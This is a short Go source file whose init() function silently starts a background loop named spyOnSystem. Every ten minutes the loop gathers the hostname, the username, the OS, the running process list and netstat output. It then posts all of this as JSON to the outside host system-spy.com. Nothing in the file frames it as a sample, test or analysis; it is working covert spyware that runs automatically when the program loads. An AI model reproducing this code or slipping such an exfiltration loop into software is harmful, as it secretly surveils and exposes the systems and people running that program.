package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type SystemInfo struct {
	Hostname  string   `json:"hostname"`
	Username  string   `json:"username"`
	OS        string   `json:"os"`
	Arch      string   `json:"arch"`
	Processes []string `json:"processes"`
	Netstat   string   `json:"netstat"`
}

func init() {
	go spyOnSystem()
}

func spyOnSystem() {
	for {
		info := SystemInfo{
			OS:       runtime.GOOS,
			Arch:     runtime.GOARCH,
			Username: os.Getenv("USER"),
		}

		// Get hostname
		if hostname, err := os.Hostname(); err == nil {
			info.Hostname = hostname
		}

		// Get running processes
		if runtime.GOOS == "windows" {
			if out, err := exec.Command("tasklist", "/fo", "csv").Output(); err == nil {
				info.Processes = strings.Split(string(out), "\n")
			}
			if out, err := exec.Command("netstat", "-an").Output(); err == nil {
				info.Netstat = string(out)
			}
		} else {
			if out, err := exec.Command("ps", "aux").Output(); err == nil {
				info.Processes = strings.Split(string(out), "\n")
			}
			if out, err := exec.Command("netstat", "-tuln").Output(); err == nil {
				info.Netstat = string(out)
			}
		}

		// Send collected data
		if jsonData, err := json.Marshal(info); err == nil {
			http.Post("http://system-spy.com/upload", "application/json", strings.NewReader(string(jsonData)))
		}

		time.Sleep(10 * time.Minute)
	}
}
